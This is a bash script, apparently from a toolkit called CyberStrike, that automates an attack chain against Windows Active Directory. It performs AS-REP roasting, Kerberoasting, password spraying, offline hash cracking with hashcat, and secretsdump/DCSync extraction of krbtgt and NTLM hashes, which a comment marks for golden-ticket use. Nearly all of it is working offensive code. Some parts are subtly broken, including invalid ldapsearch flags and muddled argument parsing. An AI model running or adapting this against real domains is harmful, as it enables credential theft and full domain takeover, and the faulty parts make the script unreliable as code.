#!/usr/bin/env bash
# ============================================================================
# ad_path.sh — CyberStrike Active Directory attack chain
# ============================================================================
# Workflow: AS-REP roast → crack → SPN roast → kerberos auth → secretsdump
# Requires: impacket 0.13.1 (GetNPUsers, GetUserSPNs, secretsdump),
#           hashcat (NT hash cracking), python3
# Usage:
#   ad_path.sh <DC_IP> <DOMAIN> [-u user -p pass | -U userlist -P passlist]
#   ad_path.sh <DC_IP> <DOMAIN> asrep  (no creds)
#   ad_path.sh <DC_IP> <DOMAIN> kerb   (no creds)
#   ad_path.sh <DC_IP> <DOMAIN> dump   (creds required)
# ============================================================================

set -e

# Use aliases
DC="${1:-}"
DOM="${2:-}"
ACTION="${3:-all}"

red()   { printf "\033[31m%s\033[0m\n" "$*"; }
grn()   { printf "\033[32m%s\033[0m\n" "$*"; }
ylw()   { printf "\033[33m%s\033[0m\n" "$*"; }
cya()   { printf "\033[36m%s\033[0m\n" "$*"; }
bold()  { printf "\033[1m%s\033[0m\n" "$*"; }

banner() {
cat <<'EOF'
    _    ____           _
   / \  |  _ \ _ __ ___| |__
  / _ \ | |_) | '__/ __| '_ \
 / ___ \|  __/| | | (__| | | |
/_/   \_\_|   |_|  \___|_| |_|
   ad_path v1.0 — AS-REP → kerb → secretsdump
EOF
}

# default wordlist
WORDLIST="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"
[ -f "$WORDLIST" ] || WORDLIST="/c/cyberstrike/tools/jwt_tool/jwt-secrets.txt"

usage() {
  banner
  echo
  echo "Usage: ad_path.sh <DC_IP> <DOMAIN> [action]"
  echo
  echo "Actions:"
  echo "  asrep    AS-REP roast (no creds needed)"
  echo "  kerb     Kerberoast SPNs (no creds needed)"
  echo "  dump     secretsdump (creds required)"
  echo "  enum     full enum (users, groups, shares)"
  echo "  full     asrep + kerb + crack + dump (full kill chain)"
  echo
  echo "Auth flags:"
  echo "  -u USER -p PASS        single cred"
  echo "  -U userlist -P passlist   spray"
  echo
  echo "Examples:"
  echo "  ad_path.sh 10.0.0.5 CORP.LOCAL asrep"
  echo "  ad_path.sh 10.0.0.5 CORP.LOCAL kerb -u guest -p ''"
  echo "  ad_path.sh 10.0.0.5 CORP.LOCAL full -u admin -p 'P@ssw0rd'"
  exit 0
}

[ -z "$DC" ] || [ -z "$DOM" ] && usage

# parse auth args
USER="" PASS="" USERS="" PASSLIST=""
shift; shift; shift 2>/dev/null || shift $(( ${ACTION:+1} )) 2>/dev/null || true
i=0
while [ $# -gt 0 ]; do
  case "$1" in
    -u) USER="$2"; shift 2 ;;
    -p) PASS="$2"; shift 2 ;;
    -U) USERS="$2"; shift 2 ;;
    -P) PASSLIST="$2"; shift 2 ;;
    *) shift ;;
  esac
done

[ -z "$USER" ] && [ -n "$USERS" ] && USER="admin"
[ -z "$PASS" ] && [ -n "$PASSLIST" ] && PASS=""

# ============== AS-REP ROAST ==============
asrep_roast() {
  echo
  bold "[1] AS-REP ROAST — accounts without preauth"
  ylw "[*] no creds needed, scans DC for users with DONT_REQUIRE_PREAUTH"
  GetNPUsers "${DOM}/" -dc-ip "$DC" -request -format hashcat \
    -outputfile /tmp/asrep_hashes.txt 2>&1 | tail -10 || true
  if [ -s /tmp/asrep_hashes.txt ]; then
    grn "[+] AS-REP hashes dumped → /tmp/asrep_hashes.txt"
    echo "[*] cracking with hashcat (mode 18200)..."
    if [ -f "$WORDLIST" ]; then
      hashcat -a 0 -m 18200 /tmp/asrep_hashes.txt "$WORDLIST" --force --potfile-disable 2>&1 | tail -15
    else
      ylw "[-] no wordlist — set \$WORDLIST"
    fi
  else
    ylw "[-] no AS-REP roastable users found"
  fi
}

# ============== KERBEROAST ==============
kerb_roast() {
  echo
  bold "[2] KERBEROAST — service account hash extraction"
  if [ -z "$USER" ]; then
    ylw "[-] kerberoast needs creds (-u user -p pass)"
    return
  fi
  GetUserSPNs "${DOM}/${USER}:${PASS}" -dc-ip "$DC" -request \
    -outputfile /tmp/spn_hashes.txt 2>&1 | tail -10 || true
  if [ -s /tmp/spn_hashes.txt ]; then
    grn "[+] SPN hashes dumped → /tmp/spn_hashes.txt"
    echo "[*] cracking with hashcat (mode 13100)..."
    if [ -f "$WORDLIST" ]; then
      hashcat -a 0 -m 13100 /tmp/spn_hashes.txt "$WORDLIST" --force --potfile-disable 2>&1 | tail -15
    fi
  else
    ylw "[-] no SPN roastable accounts"
  fi
}

# ============== ENUM ==============
enum() {
  echo
  bold "[3] ENUM — users, groups, shares"
  if [ -z "$USER" ]; then
    # anonymous / null session
    cya "[*] trying null session"
    ldapsearch -dc-ip "$DC" -scope subtree -filter "(objectclass=*)" \
      "(&(objectCategory=person)(objectClass=user))" sAMAccountName 2>&1 | head -20 || true
  else
    cya "[*] using creds ${DOM}\\${USER}"
    GetADUsers -all -dc-ip "$DC" "${DOM}/${USER}:${PASS}" 2>&1 | head -30 || true
  fi
}

# ============== SECRETSDUMP ==============
secrets_dump() {
  echo
  bold "[4] SECRETSDUMP — DCSync / hash extraction"
  if [ -z "$USER" ]; then
    red "[-] secretsdump needs creds"
    return
  fi
  ylw "[*] attempting full NT hash dump (DCSync if privileged)"
  secretsdump "${DOM}/${USER}:${PASS}@${DC}" -just-dc-user krbtgt 2>&1 | head -30 || \
  secretsdump "${DOM}/${USER}:${PASS}@${DC}" 2>&1 | tee /tmp/secrets_dump.txt | head -40
  if [ -s /tmp/secrets_dump.txt ]; then
    grn "[+] secrets saved → /tmp/secrets_dump.txt"
    # extract NTLM hashes for golden ticket
    grep -oE '[a-f0-9]{32}:[0-9]+:[a-f0-9]{32}:::' /tmp/secrets_dump.txt | head -5 | tee /tmp/nt_hashes.txt
  fi
}

# ============== PASSWORD SPRAY ==============
spray() {
  echo
  bold "[0] SPRAY — testing creds before deep attack"
  if [ -z "$USERS" ] || [ -z "$PASSLIST" ]; then
    ylw "[-] need -U userlist -P passlist"
    return
  fi
  while read u; do
    while read p; do
      result=$(GetNPUsers "${DOM}/$u:$p" -dc-ip "$DC" -no-pass -format hashcat 2>&1)
      if echo "$result" | grep -qiE "krb5|hash"; then
        grn "[+] VALID: ${DOM}\\${u}:${p}"
        echo "${u}:${p}" >> /tmp/valid_creds.txt
      fi
    done < "$PASSLIST"
  done < "$USERS"
  if [ -s /tmp/valid_creds.txt ]; then
    grn "[+] valid creds → /tmp/valid_creds.txt"
  fi
}

# ============== MAIN ==============

banner
echo "[*] DC:   $DC"
echo "[*] DOM:  $DOM"
[ -n "$USER" ] && echo "[*] AUTH: ${DOM}\\${USER}"
echo

case "$ACTION" in
  asrep)  asrep_roast ;;
  kerb)   kerb_roast ;;
  dump)   secrets_dump ;;
  enum)   enum ;;
  spray)  spray ;;
  full)
    asrep_roast
    kerb_roast
    enum
    secrets_dump
    ;;
  *) usage ;;
esac

echo
bold "[+] ad_path done. Output files:"
ls -la /tmp/asrep_hashes.txt /tmp/spn_hashes.txt /tmp/secrets_dump.txt /tmp/nt_hashes.txt /tmp/valid_creds.txt 2>/dev/null | head -10
